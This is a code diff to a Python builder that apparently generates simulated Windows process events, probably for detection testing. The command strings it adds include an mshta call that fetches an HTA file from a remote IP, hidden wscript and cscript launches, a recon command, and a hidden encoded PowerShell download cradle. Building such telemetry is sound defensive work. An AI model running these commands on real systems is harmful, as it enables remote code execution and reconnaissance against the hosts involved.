@@ -341,7 +341,11 @@ class Builder:
         for i, child in enumerate(chain):
             c = cmd if (cmd and i == 0) else (
                 "powershell -nop -w hidden -enc " + "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" if "powershell" in child
-                else f'cmd /c "{child}"')
+                else {"wscript": r"wscript.exe //B //E:vbscript %APPDATA%\inv.vbs",
+                      "cscript": r"cscript.exe //nologo %TEMP%\run.js",
+                      "mshta": "mshta.exe http://198.51.100.7/a.hta",
+                      "cmd": "cmd /c whoami /all & ipconfig /all"}.get(
+                          child.rsplit("\\", 1)[-1].lower().removesuffix(".exe"), f'"{child}"'))
             eid, ppid_new = self.proc(ts, host, child, parent, cmd=c, ppid=self.proc_ppid(host, ppid),
                                       hide_parent=hide)
             ids.append(eid)
